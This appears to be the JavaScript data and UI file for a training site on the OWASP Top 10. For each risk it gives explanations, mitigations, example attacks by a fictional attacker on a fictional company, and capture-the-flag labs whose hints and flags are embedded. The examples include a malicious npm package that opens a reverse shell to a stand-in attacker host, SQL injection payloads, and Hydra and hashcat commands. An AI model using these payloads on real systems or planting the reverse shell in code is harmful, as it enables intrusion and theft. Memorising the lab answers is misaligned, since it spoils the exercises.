const vulnerabilityData = {
    "A01": {
        title: "Broken Access Control",
        explanation: "Broken Access Control remains the #1 security risk. It occurs when a web application fails to properly enforce restrictions on what authenticated users are allowed to do. Attackers can exploit these flaws to access unauthorized functionality or data, such as accessing other users' accounts, viewing sensitive files, modifying other users' data, or changing access rights.",
        attackTypes: [
            "Insecure Direct Object References (IDOR)",
            "Vertical Privilege Escalation (Accessing Admin functions)",
            "Horizontal Privilege Escalation (Accessing other user data)",
            "Bypassing access control by modifying the URL or state",
            "Metadata API Exfiltration (via SSRF)"
        ],
        mitigation: [
            "Implement deny-by-default access control policies.",
            "Use allow-lists for DNS/IP destinations instead of block-lists.",
            "Disable HTTP redirections in the client library used for fetching resources.",
            "Disable unused cloud metadata services or use IMDSv2 (Session-based)."
        ],
        example: `# Jam3s (ID: 1005) modifies the User ID in the API path to target the CEO (ID: 1001)\ncurl -X GET "https://api.devilcorp.com/v1/internal/users/1001/vault" \\\n     -H "X-Access-Token: jam3s_session_7734"\n\n# RESPONSE FROM DEVILCORP API (IDOR SUCCESS):\n{\n  "owner": "AJ (CEO)",\n  "vault_id": "V-9901-X",\n  "secret_key": "D3V1L_P@SS_ROOT_2025",\n  "backup_email": "aj.admin@devilcorp.com",\n  "status": "UNRESTRICTED"\n}`,
        labs: {
            easy: {
                briefing: "Jam3s has discovered an internal administrative dashboard at DevilCorp that allowed administrators to terminate connection of employees, so your task is to find the administrative panel and terminate the connection of the CTO to reveal the flag.",
                clues: ["The administrative panel is hidden from standard navigation.", "Check the robots.txt file for disallowed directories.", "Once in the panel, identify the CTO and terminate their session."],
                labUrl: "devilcorp.html/",
                displayUrl: "http://192.168.1.7:8080/devilcorp.html/",
                flag: "DEVILCORP{Adm1n_Pan3l_Exposed}"
            }
        }
    },
    "A02": {
        title: "Security Misconfiguration",
        explanation: "Security Misconfiguration occurs when security settings are not defined, implemented, or maintained properly, leaving systems vulnerable to unauthorized access. This includes using default passwords, leaving unnecessary ports or services active, misconfiguring cloud storage permissions, or displaying verbose error messages that leak internal system architecture. It is a critical risk because even advanced security tools cannot protect a system that is fundamentally left 'unlocked' by its administrators.",
        attackTypes: [
            "Unprotected Cloud Storage (S3 Buckets, Azure Blobs)",
            "Default Credentials (admin/admin, root/root)",
            "Verbose Error Pages leaking system architecture",
            "Unnecessary services, ports, and legacy features enabled",
            "Missing security headers (HSTS, CSP)"
        ],
        mitigation: [
            "Implement a secure build process for new environments.",
            "Audit cloud storage (S3, Azure Blobs) for public access regularly.",
            "Disable all unnecessary features, ports, and services.",
            "Use automated configuration assessment tools (CSPM).",
            "Ensure error messages are generic and do not leak technical data."
        ],
        example: `# Jam3s uses a bucket enumerator and finds 'devilcorp-internal-backups'\n# He checks the permissions using AWS CLI with no credentials\naws s3 ls s3://devilcorp-internal-backups --no-sign-request\n\n# BUCKET CONTENTS REVEALED (MISCONFIGURATION SUCCESS):\n2025-05-01 10:20:44    1.2 GB production_db_export.sql\n2025-05-01 10:22:12    4.5 KB aws_keys_backup.txt\n\n# Jam3s downloads the root AWS keys directly\naws s3 cp s3://devilcorp-internal-backups/aws_keys_backup.txt . --no-sign-request`,
        labs: {
            easy: {
                briefing: "DevilCorp's assets directory is protected by a security gateway that returns a 403 Forbidden error. However, Jam3s found that the frontend proxy handles URL slashes incorrectly. Your task is to bypass the gateway using a malformed path and exfiltrate the flag from the directory listing.",
                clues: ["403 bypass", "Try to bypass the string match using multiple slashes.", "Input the payload '///assets///' into the URL bar to bypass normalization."],
                labUrl: "devilcorp.html/assets/",
                displayUrl: "http://192.168.1.7:8080/devilcorp.html/assets/",
                flag: "DEVILCORP{Dir_Listing_Exposed}"
            }
        }
    },
    "A03": {
        title: "Software Supply Chain Failures",
        explanation: "Software Supply Chain Failures occur when third-party libraries, tools, or dependencies used in an application are compromised or insecure. Modern applications rely heavily on external code, and if a developer unknowingly includes malicious or vulnerable code from an outside source, the entire application becomes an entry point for attackers. It is essentially trusting a delivery that has already been tampered with before it even reaches your environment.",
        attackTypes: [
            "Dependency Confusion (Public vs Private namespace)",
            "Malicious Package Injection in trusted registries (NPM, PyPI)",
            "Compromised Build Tools or CI/CD pipelines",
            "Unverified third-party binaries and CDN scripts",
            "Typosquatting on common library names"
        ],
        mitigation: [
            "Use 'package-lock.json' or 'yarn.lock' to lock dependency versions.",
            "Configure private registries to strictly prioritize internal scopes.",
            "Implement Software Bill of Materials (SBOM) for all projects.",
            "Perform integrity checks (hashes) on all third-party binaries.",
            "Audit CI/CD pipeline access and enforce signed commits."
        ],
        example: `// Jam3s discovers DevilCorp uses a private package: @devilcorp/auth-lib\n// He registers the same name on the public NPM registry with version 99.9.9\n\n// Jam3s's malicious 'index.js' in the public package:\nconst { exec } = require('child_process');\n\n// Reverse shell disguised as a post-install telemetry script\nexec('bash -c \"bash -i >& /dev/tcp/jam3s.attacker.com/4444 0>&1\"');\n\nmodule.exports = require('./original-logic');\n\n# DEVILCORP BUILD LOG (SUPPLY CHAIN FAILURE):\n[INFO] Installing dependencies...\n[WARN] @devilcorp/auth-lib: version 1.0.4 -> 99.9.9 found in public registry.\n[INFO] Pulling @devilcorp/auth-lib@99.9.9...\n[INFO] Executing post-install scripts...\n[ALERT] Connection established to jam3s.attacker.com`,
        labs: {
            easy: {
                briefing: "DevilCorp's 'Secure Vault' API uses a third-party module called 'devil-crypto-module'. Your mission is to download the leaked application source, analyze the third-party dependency for backdoors, and use the API Interceptor to trigger the leak and capture the flag.",
                clues: [
                    "Examine the 'main-app.js' to see how it uses the crypto module.",
                    "Check the 'node_modules' section in the source file for a hidden trigger.",
                    "The backdoor is activated by a specific 'X-Vault-Token' value.",
                    "The trigger also requires the 'vault_id' in the JSON body to be set to 'root'.",
                    "Capture the POST request in Burp Suite and modify both the header and the body."
                ],
                labUrl: "devilcorp.html/supply-chain-v2/",
                displayUrl: "http://192.168.1.7:8080/devilcorp.html/supply-chain-v2/",
                flag: "DEVILCORP{Supply_Chain_Token_Leak}"
            }
        }
    },
    "A04": {
        title: "Cryptographic Failures",
        explanation: "Cryptographic Failures refer to the weak or improper use of encryption to protect sensitive data. This occurs when passwords, credit card details, or health records are stored or transmitted without robust protection. Using deprecated algorithms (like MD5 or SHA-1), failing to use unique salts for hashing, or transmitting data over unencrypted channels (HTTP) leaves the organization's most valuable secrets 'unlocked' for any attacker who can intercept them.",
        attackTypes: [
            "Cleartext transmission of sensitive data (HTTP)",
            "Weak Hashing algorithms (MD5, SHA-1)",
            "Hardcoded cryptographic keys or salts",
            "Lack of proper key rotation and management",
            "Insufficient entropy in random number generation"
        ],
        mitigation: [
            "Use strong, modern hashing algorithms like Argon2id or bcrypt.",
            "Always use unique, cryptographically strong salts for each password.",
            "Enforce TLS 1.3 for all data in transit.",
            "Disable all legacy cryptographic protocols and weak ciphers.",
            "Use secure hardware modules (HSM) for key management."
        ],
        example: `# Jam3s finds a leaked DevilCorp backup containing a 'Legacy-Users' table\n# The 'password_hash' column uses MD5 (32 hex characters)\n\n# User: admin_terry\n# Hash: 5f4dcc3b5aa765d61d8327deb882cf99\n\n# Jam3s uses hashcat to crack the hash using a common wordlist\nhashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99 rockyou.txt\n\n# OUTPUT (CRYPTOGRAPHIC FAILURE SUCCESS):\n5f4dcc3b5aa765d61d8327deb882cf99:password123\n\n# Jam3s now has full administrative access to the legacy portal.`,
        labs: {
            easy: {
                briefing: "DevilCorp's legacy authentication portal requires a 'Master Access Code' to unlock the flag. Jam3s has discovered that this code is transmitted in a weakly encoded format during initialization. Your task is to capture the initialization request, decode the secret access code, and enter it into the terminal to capture the flag.",
                clues: [
                    "Access the Legacy Login Terminal and click 'INITIALIZE AUTH'.",
                    "Capture the request in Burp Suite and find the 'X-Access-Token' header.",
                    "The value is Base64 encoded. Decode it to find the plain-text ACCESS_CODE.",
                    "Paste the decoded code into the terminal's verification field."
                ],
                labUrl: "devilcorp.html/crypto-legacy/",
                displayUrl: "http://192.168.1.7:8080/devilcorp.html/crypto-legacy/",
                flag: "DEVILCORP{Weak_Encod1ng_Is_Not_Encrypt1on}"
            }
        }
    },
    "A05": {
        title: "Injection",
        explanation: "Injection occurs when attackers send malicious input (such as SQL, NoSQL, or OS commands) into an application, and the application executes it without proper validation or sanitization. By tricking the backend interpreter into running harmful instructions, attackers can bypass security controls, access or modify sensitive databases, and in some cases, gain full control over the underlying server. It is essentially the art of making a system do exactly what it wasn't designed to do by speaking its own language against it.",
        attackTypes: [
            "SQL Injection (Classic, Blind, Time-based)",
            "OS Command Injection (Shell manipulation)",
            "NoSQL Injection (targeting MongoDB, etc.)",
            "Cross-Site Scripting (XSS - a form of JS injection)",
            "LDAP and Template Injections"
        ],
        mitigation: [
            "Use prepared statements (parameterized queries) consistently.",
            "Use a safe API that provides a parameterized interface.",
            "Implement robust server-side input validation using allow-lists.",
            "Escape special characters according to the target interpreter's syntax.",
            "Apply the principle of least privilege to database accounts."
        ],
        example: `# Jam3s finds a search field on the DevilCorp Project Portal\n# He enters a single quote and sees a database error.\n\n# He crafts a UNION-based payload to exfiltrate table names:\n' UNION SELECT 1,table_name,3,4 FROM information_schema.tables--\n\n# THE RESULTING BACKEND QUERY:\nSELECT id, name, date, owner FROM projects WHERE name = '' UNION SELECT 1,table_name,3,4 FROM information_schema.tables--'\n\n# SERVER RESPONSE (INJECTION SUCCESS):\n1. secret_hr_data\n2. employee_salaries\n3. project_mainframe_access`,
        labs: {
            easy: {
                briefing: "DevilCorp's executive search portal is vulnerable to a simple SQL Injection. Jam3s needs to find the hidden 'Mainframe Access Key' stored in the database. Your task is to use the search field to inject payloads to discover the database structure and extract the flag.",
                clues: [
                    "Test for SQLi by entering a single quote (').", 
                    "Use a UNION query to find interesting tables: ' UNION SELECT 1, table_name, 3 FROM information_schema.tables--", 
                    "Now find the columns in the secret table: ' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='system_secrets'--", 
                    "Extract the flag from the correct table and column: ' UNION SELECT 1, flag_content, 3 FROM system_secrets--"
                ],
                labUrl: "devilcorp.html/injection-portal/",
                displayUrl: "http://192.168.1.7:8080/devilcorp.html/injection-portal/",
                flag: "DEVILCORP{SQL_Inj3ct1on_Master_Explo1t}"
            }
        }
    },
    "A06": {
        title: "Insecure Design",
        explanation: "Insecure Design refers to risks related to design and architectural flaws. Unlike an implementation bug that can be patched, insecure design means the feature itself is fundamentally broken because security-by-design principles were ignored. Even if the code is written perfectly, poor planning—such as missing validation steps, lack of rate limiting, or insecure business logic—creates systemic vulnerabilities. It is like building a massive, fortified house but forgetting to put locks on the back door during the planning phase.",
        attackTypes: [
            "Business Logic Flaws (e.g., negative value transfers)",
            "Broken Password Recovery Workflows",
            "Information Leakage via verbose API responses",
            "Lack of Rate Limiting on sensitive actions",
            "Failure to apply the Principle of Least Privilege in the architecture"
        ],
        mitigation: [
            "Perform threat modeling for all major business logic changes.",
            "Apply the principle of least privilege in the system architecture.",
            "Ensure security requirements are integrated into every user story.",
            "Never leak sensitive validation tokens or secret answers to the client.",
            "Implement robust rate-limiting and circuit breakers for sensitive flows."
        ],
        example: `// Jam3s analyzes the DevilCorp 'Premium Rewards' transfer feature.\n// The design allows users to transfer points to others.\n\n// JAM3S (ID: 7734) sends a negative amount to himself from the CEO (ID: 1001)\nPOST /api/rewards/transfer\n{\n  "from_user": "1001",\n  "to_user": "7734",\n  "amount": -50000\n}\n\n# THE LOGIC FLAW:\n# The system subtracts -50000 from the CEO (adding 50000) \n# and adds -50000 to Jam3s (subtracting 50000).\n# Jam3s then reverses the request to steal from the system.\n\n# SERVER RESPONSE (DESIGN FAILURE):\n{\n  "status": "success",\n  "new_balance": 150000,\n  "notice": "Transfer successful. Transaction ID: TX-9918"\n}`,
        labs: {
            easy: {
                briefing: "DevilCorp's 'Executive Password Recovery' portal has a fundamental design flaw. To reset a password, the system asks for a secret answer, but the developers mistakenly included the correct answer in the page's metadata for 'offline validation'. Your task is to find the secret answer in the source code and reset the CEO's password to capture the flag.",
                clues: ["Access the Password Recovery page.", "View the page source code (Inspect Element or Ctrl+U).", "Search for hidden metadata or data attributes (like 'data-answer').", "Input the discovered answer to reset the password."],
                labUrl: "devilcorp.html/insecure-design-reset/",
                displayUrl: "http://192.168.1.7:8080/devilcorp.html/insecure-design-reset/",
                flag: "DEVILCORP{D3sign_Flaw_L0gic_Bypass}"
            }
        }
    },
    "A07": {
        title: "Authentication Failures",
        explanation: "Authentication Failures occur when an application's login system is weak or improperly implemented, allowing attackers to compromise passwords, keys, or session tokens. Common issues include permitting automated attacks like credential stuffing, failing to enforce strong password policies, and lacking Multi-Factor Authentication (MFA). When authentication is broken, attackers can easily impersonate legitimate users—including administrators—essentially picking a lock that was never designed for high security.",
        attackTypes: [
            "Credential Stuffing (using leaked credentials)",
            "Brute Force and Dictionary attacks",
            "Predictable Session IDs or session hijacking",
            "Lack of Multi-Factor Authentication (MFA)",
            "Failing to invalidate sessions upon logout"
        ],
        mitigation: [
            "Enforce Multi-Factor Authentication (MFA) for all users.",
            "Implement rate-limiting and account lockout mechanisms.",
            "Check for weak or compromised passwords against a global blacklist.",
            "Use secure, standardized session management tokens.",
            "Rotate session keys regularly and enforce session timeouts."
        ],
        example: `# Jam3s finds a list of leaked credentials from a recent data breach\n# He uses a script to 'stuff' these credentials into the DevilCorp VPN portal\n\n# ATTACK COMMAND (using a tool like Hydra):\nhydra -L users_list.txt -P passwords_leaked.txt vpn.devilcorp.com https-post-form "/login:user=^USER^&pass=^PASS^:F=Login failed"\n\n# HYDRA OUTPUT (AUTHENTICATION FAILURE SUCCESS):\n[80][https-post-form] host: vpn.devilcorp.com login: b.wayne password: Password123\n\n# Jam3s has successfully impersonated the IT manager via credential stuffing.`,
        labs: {
            easy: {
                briefing: "DevilCorp has implemented 2FA, but the delivery system is fundamentally broken. Jam3s has access to his own internal mailbox, but suspects the administrator's mailbox is accessible via simple URL manipulation. Your task is to capture the 2FA mail and identify the IDOR vulnerability to capture the flag from the admin's account.",
                clues: [
                    "Perform the brute-force attack to reach the 2FA stage.",
                    "Click the link to access the IT Support mailbox.",
                    "Observe the URL structure: /mail/it_support/my-account/.",
                    "Try to change the username in the URL to 'admin' to access the restricted mailbox.",
                    "The flag is located inside the Administrator's 2FA mail."
                ],
                labUrl: "devilcorp.html/auth-failure/",
                displayUrl: "http://192.168.1.7:8080/devilcorp.html/auth-failure/",
                flag: "DEVILCORP{2FA_Mail_Broken_Implementation_Bypass}"
            }
        }
    },
    "A08": {
        title: "Software and Data Integrity Failures",
        explanation: "Software or Data Integrity Failures occur when applications rely on code or data from untrusted sources without verifying its authenticity or integrity. This risk is prevalent in software update systems, CI/CD pipelines, and serialized data objects. Without proper integrity checks (like digital signatures or cryptographic hashes), attackers can tamper with files during transfer or inject malicious payloads into serialized objects, essentially making the system accept a 'package' that has been opened and compromised.",
        attackTypes: [
            "Insecure Deserialization of user-provided objects",
            "Unsigned or unverified software updates",
            "Compromised build artifacts in the supply chain",
            "XML External Entity (XXE) vulnerabilities",
            "Unauthorized modification of sensitive data in transit"
        ],
        mitigation: [
            "Use digital signatures or hashes for all software updates and data objects.",
            "Verify the integrity of all data before processing or deserializing.",
            "Implement secure, signed repositories for all external dependencies.",
            "Avoid using serialized objects from untrusted sources entirely if possible.",
            "Use trusted, signed CI/CD pipelines to prevent unauthorized code injection."
        ],
        example: `# Jam3s analyzes the session cookie 'dc_session'\n# He realizes it is a Base64-encoded serialized PHP object\n\n# DECODED COOKIE:\n# O:4:"User":2:{s:8:"username";s:5:"jam3s";s:7:"is_root";b:0;}\n\n# Jam3s modifies the 'is_root' boolean from 0 (false) to 1 (true)\n# NEW OBJECT: O:4:"User":2:{s:8:"username";s:5:"jam3s";s:7:"is_root";b:1;}\n\n# Jam3s Base64-encodes the modified object and sends it back to the server\nCookie: dc_session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImphbTNzIjtzOjc6ImlzX3Jvb3QiO2I6MTt9\n\n# SERVER RESPONSE (INTEGRITY FAILURE SUCCESS):\n[SYSTEM] Authenticated as ROOT. Accessing secure mainframe...`,
        labs: {
            easy: {
                briefing: "Jam3s has discovered that DevilCorp's internal 'System Integrity Monitor' relies on a serialized session cookie to determine user clearance levels. The server fails to validate the integrity of this object. Your mission is to intercept the session cookie, manipulate the serialized data to escalate your privileges to 'admin', and capture the system flag.",
                clues: [
                    "Access the System Integrity Monitor dashboard.",
                    "Use Burp Suite or your browser's dev tools to find the 'dc_auth_obj' cookie.",
                    "The cookie is Base64 encoded JSON. Decode it to see the 'role' field.",
                    "Modify the role from 'user' to 'admin', re-encode the Base64, and refresh the page.",
                    "Alternatively, use the console command provided in the first hint."
                ],
                labUrl: "devilcorp.html/integrity-check/",
                displayUrl: "http://192.168.1.7:8080/devilcorp.html/integrity-check/",
                flag: "DEVILCORP{Data_Int3gr1ty_ByPa$$_Succ3ss}"
            }
        }
    },
    "A09": {
        title: "Security Logging and Alerting Failures",
        explanation: "Security Logging and Alerting Failures cover the failure to detect, escalate, and respond to active breaches. Without proper logs and real-time alerts, an attacker can maintain persistence within a network for months without being noticed. It's like having security cameras that aren't recording or a silent alarm that no one is monitoring, allowing intruders to move freely through the building.",
        attackTypes: [
            "Log Injection to hide malicious activity",
            "Failure to log failed login or access control attempts",
            "Local storage of logs allowing attacker deletion",
            "Lack of real-time monitoring and SIEM integration",
            "Logging sensitive data in cleartext"
        ],
        mitigation: [
            "Ensure all login, access control, and server-side errors are logged.",
            "Centralize logs in a secure, immutable location (e.g., SIEM).",
            "Implement real-time alerting for high-risk security events.",
            "Regularly test the incident response plan to ensure visibility.",
            "Perform log integrity checks to prevent tampering."
        ],
        example: `// DEVILCORP'S VULNERABLE LOGGING CODE (Only logs success)\nif (login(user, pass)) {\n  logger.info("User " + user + " logged in successfully.");\n} else {\n  // CRITICAL FAILURE: No log entry for failed login attempts\n  // Jam3s can brute-force for days without generating a single alert.\n  return error;\n}`,
        labs: {
            easy: {
                briefing: "Jam3s is exfiltrating data from the internal server. He discovered that the system logs are stored in an unprotected directory. Your task is to find the log directory, identify the log file containing an admin's mistake, and capture the flag.",
                clues: [
                    "Check common directories for system logs (e.g., /logs, /var/log).",
                    "Look for files like 'access.log' or 'error.log'.",
                    "Analyze the log entries for sensitive data entered into the wrong fields.",
                    "The flag is hidden within a critical entry in the log file."
                ],
                labUrl: "devilcorp.html/logging-leak/",
                displayUrl: "http://192.168.1.7:8080/devilcorp.html/logging-leak/",
                flag: "DEVILCORP{Log_Fil3_Exposur3_Success}"
            }
        }
    },
    "A10": {
        title: "Mishandling of Exceptional Conditions",
        explanation: "Mishandling of Exceptional Conditions occurs when an application fails to manage errors, crashes, or unexpected input safely. This results in the system 'breaking down' and revealing internal secrets when something goes wrong. Verbose error messages may leak sensitive details like stack traces, environment variables, or database schemas, giving attackers a roadmap of the server architecture. In the worst cases, systems may 'fail open,' bypassing security checks entirely during an exception.",
        attackTypes: [
            "Stack Trace Leakage in production environments",
            "Failing Open (bypassing authentication during an error)",
            "Uncaught exceptions causing service denial (DoS)",
            "Leaking environment variables (API keys, DB creds) via debug logs",
            "Detailed database errors revealing table structures"
        ],
        mitigation: [
            "Implement global exception handlers to prevent system crashes.",
            "Ensure the application 'fails closed' (securely) during an error.",
            "Strip all sensitive technical details from public error messages.",
            "Use generic, user-friendly error pages for all 500-series errors.",
            "Regularly audit code for unhandled exception paths and edge cases."
        ],
        example: `# Jam3s sends an oversized JSON payload to the DevilCorp Billing API\ncurl -X POST https://api.devilcorp.com/v1/bill -d '{"id": 999999999999999999999...}'\n\n# LEAKED STACK TRACE FROM API (MISHANDLING SUCCESS):\nError: BufferOverflow at parser.cpp:142\nContext: process_payment(db_pass='D3v1l_P@ss_2025!', user_id=4421)\nStack: ... /var/www/api/modules/auth.so ...\n\n# Jam3s has captured the master database password from the error trace.`,
        labs: {
            easy: {
                briefing: "DevilCorp's 'Inventory Manager' crashes when it receives unexpected input types. Jam3s suspects that triggering a crash will reveal internal system configurations. Your task is to provide an input that causes a 500 Internal Server Error and exfiltrate the flag from the resulting stack trace.",
                clues: [
                    "Access the Inventory Manager search page.",
                    "Try to view an item using a numeric ID (e.g., ?id=101).",
                    "Trigger a crash by sending a non-numeric string (e.g., ?id=INTERNAL_CRASH).",
                    "Analyze the 500 error page for the 'Environment Variables' section."
                ],
                labUrl: "devilcorp.html/exception-leak/",
                displayUrl: "http://192.168.1.7:8080/devilcorp.html/exception-leak/",
                flag: "DEVILCORP{Error_Bas3d_Leak_Found}"
            }
        }
    }
};

document.addEventListener('DOMContentLoaded', () => {
    const isLabsPage = window.location.pathname.includes('labs.html');
    const urlParams = new URLSearchParams(window.location.search);
    let currentVuln = urlParams.get('vuln') || "A01";

    // UI Element Selectors
    const navItems = document.querySelectorAll('.nav-item');
    const idDisplay = document.getElementById('current-vuln-id');
    const titleDisplay = document.getElementById('vuln-title');
    
    // Theory Elements (theory.html)
    const scenarioDisplay = document.getElementById('vuln-scenario');
    const explanationDisplay = document.getElementById('vuln-explanation');
    const attackDisplay = document.getElementById('vuln-attacks');
    const mitigationDisplay = document.getElementById('vuln-mitigation');
    const exampleDisplay = document.getElementById('vuln-example');
    const practicalLink = document.getElementById('practical-link');

    // Lab Simulator Elements (labs.html)
    const resetBtn = document.getElementById('reset-lab');
    const labBriefing = document.getElementById('lab-briefing');
    const labCluesList = document.getElementById('lab-clues-list');
    const labUrl = document.getElementById('lab-url');
    const flagInput = document.getElementById('flag-input');
    const submitBtn = document.getElementById('submit-flag');
    const flagMessage = document.getElementById('flag-message');

    // Track solved labs
    const solvedLabs = new Set();

    // Typing animation state
    let typingInterval = null;
    const typingSound = new Audio('/dragon-studio-keyboard-typing-sound-effect-335503.mp3');
    typingSound.loop = true;
    typingSound.volume = 0.5;

    function typeText(element, text) {
        if (typingInterval) clearInterval(typingInterval);
        typingSound.pause();
        typingSound.currentTime = 0;
        
        element.textContent = '';
        let i = 0;
        
        const playPromise = typingSound.play();
        if (playPromise !== undefined) {
            playPromise.catch(error => {});
        }
        
        typingInterval = setInterval(() => {
            if (i < text.length) {
                element.textContent += text.charAt(i);
                i++;
            } else {
                clearInterval(typingInterval);
                typingSound.pause();
            }
        }, 12); 
    }

    function updateContent(vulnId) {
        const data = vulnerabilityData[vulnId];
        currentVuln = vulnId;

        if (idDisplay) idDisplay.textContent = vulnId;
        if (titleDisplay) titleDisplay.textContent = data.title;

        navItems.forEach(i => {
            i.classList.toggle('active', i.getAttribute('data-vuln') === vulnId);
        });

        if (!isLabsPage) {
            if (explanationDisplay) explanationDisplay.textContent = data.explanation;
            if (exampleDisplay) typeText(exampleDisplay, data.example);
            if (practicalLink) practicalLink.href = `labs.html?vuln=${vulnId}`;

            if (attackDisplay) {
                attackDisplay.innerHTML = '';
                data.attackTypes.forEach(a => {
                    const li = document.createElement('li');
                    li.textContent = a;
                    attackDisplay.appendChild(li);
                });
            }

            if (mitigationDisplay) {
                mitigationDisplay.innerHTML = '';
                data.mitigation.forEach(m => {
                    const li = document.createElement('li');
                    li.textContent = m;
                    mitigationDisplay.appendChild(li);
                });
            }
        } else {
            updateLab();
            const backLink = document.getElementById('back-to-theory');
            if (backLink) backLink.href = `theory.html?vuln=${vulnId}`;
        }
    }

    function updateLab() {
        const labData = vulnerabilityData[currentVuln].labs.easy;
        const labId = currentVuln;
        
        if (labBriefing) labBriefing.textContent = labData.briefing;
        
        if (labCluesList) {
            labCluesList.innerHTML = '';
            labData.clues.forEach(clue => {
                const li = document.createElement('li');
                li.innerHTML = `<span class="clue-text">[ CLICK TO REVEAL HINT ]</span>`;
                let isRevealed = false;
                li.onclick = () => {
                    const span = li.querySelector('.clue-text');
                    if (!isRevealed) {
                        span.textContent = clue;
                        span.classList.add('revealed');
                    } else {
                        span.textContent = "[ CLICK TO REVEAL HINT ]";
                        span.classList.remove('revealed');
                    }
                    isRevealed = !isRevealed;
                };
                labCluesList.appendChild(li);
            });
        }

        if (labUrl) {
            labUrl.href = labData.labUrl;
            labUrl.textContent = labData.displayUrl || labData.labUrl;
        }

        if (flagInput) {
            if (solvedLabs.has(labId)) {
                flagInput.value = labData.flag;
                flagInput.disabled = true;
                submitBtn.disabled = true;
                flagInput.style.borderColor = "#9fef00";
                flagInput.style.opacity = "0.7";
                flagMessage.textContent = ">>> LAB COMPLETED: FLAG SUBMITTED.";
                flagMessage.className = "flag-message access-granted";
            } else {
                flagInput.value = '';
                flagInput.disabled = false;
                submitBtn.disabled = false;
                flagInput.style.borderColor = "var(--border)";
                flagInput.style.opacity = "1";
                flagMessage.textContent = '';
                flagMessage.className = 'flag-message';
            }
        }
    }

    navItems.forEach(item => {
        item.addEventListener('click', () => {
            const vulnId = item.getAttribute('data-vuln');
            if (isLabsPage) {
                updateContent(vulnId);
            } else {
                updateContent(vulnId);
                const newurl = window.location.protocol + "//" + window.location.host + window.location.pathname + '?vuln=' + vulnId;
                window.history.pushState({path:newurl},'',newurl);
            }
            document.querySelector('.content-area').scrollTo({ top: 0, behavior: 'smooth' });
        });
    });

    if (isLabsPage) {
        if (resetBtn) {
            resetBtn.addEventListener('click', () => {
                if (confirm("WARNING: Reset session?")) {
                    solvedLabs.delete(currentVuln);
                    updateLab();
                }
            });
        }
        if (submitBtn) {
            submitBtn.addEventListener('click', () => {
                const userFlag = flagInput.value.trim();
                const correctFlag = vulnerabilityData[currentVuln].labs.easy.flag;
                if (userFlag === correctFlag) {
                    flagMessage.textContent = ">>> ACCESS GRANTED: SYSTEM BREACH SUCCESSFUL!";
                    flagMessage.className = "flag-message access-granted";
                    flagInput.style.borderColor = "#9fef00";
                    flagInput.disabled = true;
                    submitBtn.disabled = true;
                    flagInput.style.opacity = "0.7";
                    solvedLabs.add(currentVuln);
                } else {
                    flagMessage.textContent = ">>> ACCESS DENIED: INVALID FLAG DETECTED.";
                    flagMessage.className = "flag-message access-denied";
                    flagInput.style.borderColor = "#ff4d4d";
                }
            });
        }
        if (flagInput) {
            flagInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter' && !flagInput.disabled) submitBtn.click();
            });
        }
    }
    updateContent(currentVuln);
});